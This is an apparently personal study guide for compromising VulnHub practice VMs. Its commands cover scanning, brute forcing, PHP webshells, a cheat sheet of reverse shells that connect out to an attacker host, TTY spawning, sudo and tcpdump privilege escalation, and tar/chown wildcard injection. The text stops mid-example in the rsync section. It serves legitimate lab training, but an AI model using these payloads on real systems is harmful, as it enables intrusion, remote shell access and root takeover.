Learning from the field : Vulnhub
==================================

This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the VulnHub. Once you download the virtual machine from the website and run it in VMware or Virtual Box,
below steps could be followed to find the vulnerabilties.

Finding the IP address
-----------------------

Netdiscover
^^^^^^^^^^^

An active/passive arp reconnaissance tool

::

  netdiscover [options] 
  -i interface : The network interface to sniff and inject packets. 
  -r range : Scan a given range instead of auto scan.

  Example: 
  netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24 
	
Interface name for Virtualization Software

* Virtualbox : vboxnet 
* Vmware     : vmnet 

Nmap
^^^^^^

Network exploration tool and security / port scanner 

::

  nmap [Scan Type] [Options] {target specification} 
  -sP/-sn Ping Scan -disable port scan 

  Example: nmap -sP/-sn 192.168.1.0/24

Port Scanning
--------------
	
Port scanning provides a large amount of information on open services and possible exploits that target these services. Two options

Unicornscan
^^^^^^^^^^^^

A port scanner that utilizes it’s own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame. 

::  

   unicornscan [options] X.X.X.X/YY:S-E 
     -i, --interface : interface name, like eth0 or fxp1, not normally required 
     -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf' for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
     Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied. 
     Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024

    example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.

Nmap
^^^^^

Network exploration tool and security / port scanner 

::

  nmap [Scan Type] [Options] {target specification} 

  HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan 
  -sn: Ping Scan - disable port scan 
  -Pn: Treat all hosts as online -- skip host discovery

  SCAN TECHNIQUES: 
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans 
  -sU: UDP Scan -sN/sF/sX: TCP Null, FIN, and Xmas scans

  PORT SPECIFICATION: 
  -p : Only scan specified ports 
  Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9

  SERVICE/VERSION DETECTION: 
  -sV: Probe open ports to determine service/version info

  OUTPUT: 
  -oN/-oX/-oS/-oG : Output scan in normal, XML,Output in the three major formats at once 
  -v: Increase verbosity level (use -vv or more for greater effect)

  MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute


As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at `GitHub <https://github.com/superkojiman/onetwopunch>`_.

When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.

By using **amap**, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.

::

  amap -A 192.168.1.2 12380 amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
  Protocol on 192.168.1.2:12380/tcp matches http 
  Protocol on 192.168.1.2:12380/tcp matches http-apache-2 
  Protocol on 192.168.1.2:12380/tcp matches ntp 
  Protocol on 192.168.1.2:12380/tcp matches ssl
  Unidentified ports: none.
  amap v5.4 finished at 2016-08-10 05:48:16


Listen to the interface
-----------------------

We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.

:: 

  18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
  18:02:04.096330 IP 192.168.56.1.4444 > 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
  18:02:04.098567 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
  18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
  18:02:04.100756 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
  18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
  18:02:04.096292 IP 192.168.56.101.36327 > 192.168.56.1.4444: Flags [S],

On listening on the port 4444, we recieve a base64 encoded string

::

  nc -lvp 4444
  listening on [any] 4444 …
  192.168.56.101: inverse host lookup failed: Unknown host
  connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
  0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxh


From Nothing to a Unprivileged Shell
------------------------------------

At this point, you would have an idea about the different services and service version running on the system. ( aka Figure out what webservices such as cms or softwares are running on the vulnerable machine )

searchsploit
^^^^^^^^^^^^
Exploit Database Archive Search

First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.

::

  root@kali:~# nmap -sV -A 172.16.73.128
  **********Trimmed**************
  10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
  |_http-methods: No Allow or Public header in OPTIONS response (status code 200)
  |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
  | ndmp-version: 
  |_  ERROR: Failed to get host information from server
  **********Trimmed**************

If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.

::

  root@kali:~# searchsploit webmin
  **********Trimmed**************
  Description                                                                            Path
  ----------------------------------------------------------------------------------------------------------------
  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
  Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
  Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
  **********Trimmed**************
  *Insert searchsploit -xml options *

SecLists.Org Security Mailing List Archive
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

There would be some days, when you won't find vulnerability in searchsploit. We should also check the `seclists.org security mailing list google search <http://seclists.org/>`_ , if someone has reported any bug for that particular software. 

Webservices
^^^^^^^^^^^^^^^^^^^^^^^

If a webserver is running on the machine, we can start with running 
 
* **whatweb** to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.

* **PUT Method**: Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.

 Curl command can be used to check the options available:

 ::

   curl -X OPTIONS -v http://192.168.126.129/test/
   Trying 192.168.126.129…
   Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
   > OPTIONS /test/ HTTP/1.1
   > Host: 192.168.126.129
   > User-Agent: curl/7.47.0
   > Accept: /
   >
   < HTTP/1.1 200 OK
   < DAV: 1,2
   < MS-Author-Via: DAV
   < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
   < Allow: OPTIONS, GET, HEAD, POST
   < Content-Length: 0
   < Date: Fri, 29 Apr 2016 09:41:19 GMT
   < Server: lighttpd/1.4.28
   <
   * Connection #0 to host 192.168.126.129 left intact

 The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in `Detecting and exploiting the HTTP Put Method <http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html>`_ 

 The few are

 * Nmap:

  ::

    nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'

 * curl:

  ::

    curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt

  or

  :: 

    curl -X PUT -d '

* **Wordpress**

 When running wpscan, also make sure you run --enumerate u for enumerating usernames. By default wpscan doesn't run it. Also, scan for plugins

 ::

   wpsscan
     --url       | -u <target url>       The WordPress URL/domain to scan.
     --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
     --enumerate | -e [option(s)]        Enumeration.
     option :
     	u        usernames from id 1 to 10
     	u[10-20] usernames from id 10 to 20 (you must write [] chars)
     	p        plugins
     	vp       only vulnerable plugins
     	ap       all plugins (can take a long time)
     	tt       timthumbs
     	t        themes
     	vt       only vulnerable themes
     	at       all themes (can take a long time)
     	Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins
     	If no option is supplied, the default is "vt,tt,u,vp"

 Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username 

 ::

   wpscan --url http://192.168.1.2 --wordlist /home/bitvijays/Documents/Walkthru/Mr_Robot_1/test.txt --username elliot

* Names? Possible Usernames? Possible Passwords? 
   
 Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/https webserver), you would found possible  names of the employees working in the company. Now, it is common practise to have username based on your first/last name. It can be based  on named "namemash.py" available at here which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.

 * Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
 * Using VRFY command:
 * Using RCPT TO command:


* **Brute forcing: hydra:**

  ::

    -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE
    -p PASS  or -P FILE try password PASS, or load several passwords from FILE
    -U        service module usage details
    -e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass

  hydra http-post-form:

  :: 

    hydra -U http-post-form

    Help for module http-post-form:
    ============================================================================
    Module http-post-form requires the page and the parameters for the web form.

    By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three ":" separated values, plus optional values.

    (Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

    Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
    First is the page on the server to GET or POST to (URL).
    Second is the POST/GET variables (taken from either the browser, proxy, etc.
    with usernames and passwords being replaced in the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
    Third is the string that it checks for an *invalid* login (by default)
    Invalid condition login check can be preceded by "F=", successful condition
    login check must be preceded by "S=".
    This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
    			The following parameters are optional:
     			C=/page/uri     to define a different page to gather initial cookies from
     			(h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                     		^USER^ and ^PASS^ can also be put into these headers!
                     		Note: 'h' will add the user-defined header at the end
                     		regardless it's already being sent by Hydra or not.
                     		'H' will replace the value of that header if it exists, by the
                    		 one supplied by the user, or add the header at the end
    			Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
     			All colons that are not option separators should be escaped (see the examples above and below).
     			You can specify a header without escaping the colons, but that way you will not be able to put colons
     			in the header value itself, as they will be interpreted by hydra as option separators.

    			Examples:
     			"/login.php:user=^USER^&pass=^PASS^:incorrect"
     			"/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
     			"/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
     			"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
     			"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"


FTP Services
^^^^^^^^^^^^^^^^^^

If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)

::

  wget -rq ftp://IP --ftp-user=username --ftp-password=password

Remote Code Execution
^^^^^^^^^^^^^^^^^^^^^^

* MYSQL: If we have MYSQL Shell, we can use mysql outfile function to upload a shell.

 :: 

   echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e
   select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"``

* **Reverse Shells**: Mostly taken from PentestMonkey Reverse shell cheat sheet and Reverse Shell Cheat sheet from HighOn.Coffee

 * PHP: We can create a new file say ( shell.php ) on the server containing

  :: 

    <?php system($\_GET["cmd"]); ?>

  or

  :: 

    <?php echo shell_exec($\_GET["cmd"]); ?>

  which can be accessed by

  :: 

    http://IP/shell.php?cmd=id

  or we can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.

  ::

    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php

  Weely also generates a webshell

  :: 

    weevely generate password /tmp/payload.php

  which can be called by

  :: 

    weevely http://192.168.1.2/location_of_payload password

  However, it wasn't as useful as php meterpreter or reverse shell.

 * PHP Trick: This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6

  :: 

    php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'

  The above can be connected by listening at port 1337 by using nc

 * Ruby:

  :: 

    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

 * Perl:

  .. code-block :: bash 

    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

 * Python:

  .. code-block :: bash  

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

 * Java:

  .. code-block :: bash 

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

 * JSP:

  .. code-block :: bash 

     msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war

 * XTerm:

  One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

  .. code-block :: bash 

    xterm -display 10.0.0.1:1


  To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on 			your system):

  ::
 
     Xnest :1

  You’ll need to authorise the target to connect to you (command also run on your host):

  ::

    xhost +targetip

Spawning a TTY Shell
^^^^^^^^^^^^^^^^^^^^

Spawning a TTY Shell and Post-Exploitation Without A TTY has provided multiple ways to get a tty shell

.. code-block :: bash 

  python -c 'import pty; pty.spawn("/bin/sh")'

or

.. code-block :: bash

  python -c 'import pty; pty.spawn("/bin/bash")'

.. code-block :: bash

  python -c 'import os; os.system("/bin/bash")'

.. code-block :: bash

  /bin/sh -i

.. code-block :: bash 

  perl -e 'exec "/bin/sh";'

.. code-block :: bash

  perl: exec "/bin/sh";

.. code-block :: bash

   ruby: exec "/bin/sh"

.. code-block :: bash

   lua: os.execute('/bin/sh')

(From within IRB)

.. code-block :: bash

  exec "/bin/sh"

(From within vi)

.. code-block :: bash 

  :!bash

(From within vi)

.. code-block :: bash 

  :set shell=/bin/bash:shell

(From within nmap)

.. code-block :: bash 

  !sh

Using “Expect” To Get A TTY

.. code-block :: bash 

  $ cat sh.exp
  #!/usr/bin/expect
  # Spawn a shell, then allow the user to interact with it.
  # The new shell will have a good enough TTY to run tools like ssh, su and login
  spawn sh
  interact




Unprivileged shell to privileged shell
---------------------------------------

Cron.d
^^^^^^^

Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.

Suid.c

::

  int main(void) {
  setgid(0); setuid(0);
  execl(“/bin/sh”,”sh”,0); }

SUDO -l Permissions
^^^^^^^^^^^^^^^^^^^^

Let's see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump, 

* nmap suid shell:

 :: 

   nmap --script <(echo 'require "os".execute "/bin/sh"')

 or

 :: 

   nmap --interactive

* If tee is suid: tee is used to read input and then write it to output and files. That means we can use tee to read our own commands and add them to any_script.sh, which can then be run as root by a user. If some script is run as root, you may also run. For example, let's say tidy.sh is executed as root on the server, we can write the below code in temp.sh

 :: 

   temp.sh
   echo “milton ALL=(ALL) ALL” > /etc/sudoers” 

 or 

 ::

   chmod +w /etc/sudoers to add write properties to sudoers file to do the above

 and then

 :: 

   cat temp.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh

 which will add contents of temp.sh to tidyup.sh.

* tcpdump: The “-z postrotate-command” option (introduced in tcpdump version 4.0.0).

 Create a temp.sh ( which contains the commands to executed as root )

 :: 

   id
   /bin/nc 192.168.110.1 4444 -e /bin/bash

 Execute the command

 :: 

   sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z ./temp.sh -Z root

 where
 
 :: 

   -C file_size : Before  writing a raw packet to a savefile, check whether the file is currently larger than file_size and, if so, close the current savefile and open a new one.  Savefiles after the first savefile will have the name specified with the -w flag, with a number after it, starting at 1 and continuing upward.  The units of file_size are millions of bytes (1,000,000 bytes, not 1,048,576 bytes).

   -W Used  in conjunction with the -C option, this will limit the number of files created to the specified number, and begin overwriting files from the beginning, thus creating a 'rotating' buffer.  In addition,it will name the files with enough leading 0s to support the maximum number of files, allowing them to sort correctly. Used in conjunction with the -G option, this will limit the number of rotated dump files that get created, exiting with status 0 when reaching the limit. If used with -C as well, the behavior will result in cyclical files per timeslice.

   -z postrotate-command Used in conjunction with the -C or -G options, this will make tcpdump run " postrotate-command file " where file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip will compress each savefile using gzip or bzip2.

   Note that tcpdump will run the command in parallel to the capture, using the lowest priority so that this doesn't disturb the capture process.

   And in case you would like to use a command that itself takes flags or different arguments, you can always write a shell script that will take the savefile name as the only argument, make the flags &  arguments arrangements and execute the command that you want.

   -Z user 
   --relinquish-privileges=user If tcpdump is running as root, after opening the capture device or input savefile, but before opening any savefiles for output, change the user ID to user and the group ID to the primary group of user.

   This behavior can also be enabled by default at compile time.


.. Note :: More can be learn `How-I-got-root-with-sudo <https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/>`_.


Unix Wildcards
^^^^^^^^^^^^^^^

The below text is directly from the `here <https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt>`_.

* Chown file reference trick (file owner hijacking)

 First really interesting target I've stumbled across is 'chown'. Let's say that we have some publicly writeable directory with bunch of PHP files in there, and root user wants to change owner of all PHP files to 'nobody'. Pay attention to the file owners in the following files list.

 :: 

   [root@defensecode public]# ls -al
   total 52
   drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
   drwx------. 22 user user 4096 Oct 28 17:34 ..
   -rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
   -rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
   -rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
   -rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
   -rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
   -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
   -rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
   -rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
   -rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
   -rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
   -rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
   -rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
   -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
   -rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
   -rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php

 Files in this public directory are mostly owned by the user named 'user', and root user will now change that to 'nobody'.

 :: 

   [root@defensecode public]# chown -R nobody:nobody \*.php

 Let's see who owns files now...

 :: 

   root@defensecode public]# ls -al
   total 52
   drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
   drwx------. 22 user user 4096 Oct 28 17:34 ..
   -rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
   -rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
   -rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
   -rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
   -rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
   -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
   -rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
   -rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
   -rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
   -rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
   -rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
   -rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
   -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
     -rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
     -rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php


 Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group 'nobody', but somehow, all files are owned by the user 'leon' now. If we take closer look, this directory previously contained just the following two files created and owned by the user 'leon'.

 :: 

   -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
   -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php

 Thing is that wildcard character used in 'chown' command line took arbitrary '--reference=.drf.php' file and passed it to the chown command at the command line as an option.

 Let's check chown manual page (man chown):

 :: 

   --reference=RFILE     use RFILE's owner and group rather than specifying OWNER:GROUP values

 So in this case, '--reference' option to 'chown' will override 'nobody:nobody' specified as the root, and new owner of files in this directory will be exactly same as the owner of '.drf.php', which is in this case user 'leon'. Just for the record, '.drf' is short for Dummy Reference File. :)

 To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument	to the --reference option, file that's owned by some other user, not 'leon', in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically "hijack" files that are of interest to us.

 Even more, if user 'leon' previously created a symbolic link in that directory that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed to the user 'leon'.


* **Chmod file reference trick**

 Another interesting attack vector similar to previously described 'chown' attack is 'chmod'. Chmod also has --reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):

 :: 

    --reference=RFILE    :   use RFILE's mode instead of MODE values

  Example is presented below.

  :: 

    [root@defensecode public]# ls -al
    total 68
    drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
    -rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
    -rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
    -rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
    -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
    -rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
    -rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
    -rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
    -rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
    -rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
    -rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
    -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
    -rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php

  Superuser will now try to set mode 000 on all files.

  :: 

    [root@defensecode public]# chmod 000 *

  Let's check permissions on files...

  :: 

    [root@defensecode public]# ls -al
    total 68
    drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
    -rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
    -rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
    -rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
    -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
    -rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
    -rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
    -rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
    -rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
    -rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
    -rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
    -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
    -rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php

  What happened? Instead of 000, all files are now set to mode 777 because of the '--reference' option supplied through file name..Once again,file .drf.php owned by user 'leon' with mode 777 was used as reference file and since --reference option is supplied, all files will be set tomode 777. Beside just --reference option, attacker can also create another file with '-R' filename, to change file permissions on files in	all subdirectories recursively.
   

 * **Tar arbitrary command execution**
  
  Previous example is nice example of file ownership hijacking. Now, let's go to even more interesting stuff like arbitrary command execution. 		Tar is very common unix program for creating and extracting archives. Common usage for lets say creating archives is:

  :: 

    [root@defensecode public]# tar cvvf archive.tar *

  So, what's the problem with 'tar'? Thing is that tar has many options,and among them, there some pretty interesting options from arbitrary parameter injection point of view. Let's check tar manual page (man tar):

  :: 

    --checkpoint[=NUMBER]      : display progress messages every NUMBERth record (default 10)
    --checkpoint-action=ACTION : execute ACTION on each checkpoint

  There is '--checkpoint-action' option, that will specify program which will be executed when checkpoint is reached. Basically, that allows us arbitrary command execution.

  Check the following directory:

  :: 

    [root@defensecode public]# ls -al
    total 72
    drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
    drwx------. 24 user user  4096 Oct 28 18:32 ..
    -rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
    -rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
    -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
    -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
    -rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
    -rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
    -rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
    -rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
    -rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
    -rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
    -rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
    -rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
    -rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
    -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

  Now, for example, root user wants to create archive of all files in current directory.

  :: 

    [root@defensecode public]# tar cf archive.tar *
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
    uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

  Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command execution under root privileges. Once again, there are few files created by user 'leon'.

  :: 

    -rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
    -rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
    -rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh

  Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 'tar' program as command line options. Basically, they command tar to execute shell.sh shell script upon the execution.

  :: 

    [root@defensecode public]# cat shell.sh
    /usr/bin/id

  So, with this tar argument pollution, we can basically execute arbitrary commands with privileges of the user that runs tar. As demonstrated on the 'root' account above.
   

 * **Rsync arbitrary command execution**

  Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very common on Unix systems. If we check 'rsync' manual page, we can again find options that can be abused for arbitrary command execution.

  Rsync manual: "You use rsync in the same way you use rcp. You must specify a source and a destination, one of which may be remote."

  Interesting rsync option from manual:

  :: 

    -e, --rsh=COMMAND       specify the remote shell to use
    --rsync-path=PROGRAM    specify the rsync to run on remote machine			

  Let's abuse one example directly from the 'rsync' manual page. Following example will copy all C files in local directory to a remote host 'foo' in '/src' directory.

  :: 

    # rsync -t *.c foo:src/


  Directory content:

  :: 

    [root@defensecode public]# ls -al
    total 72
    drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
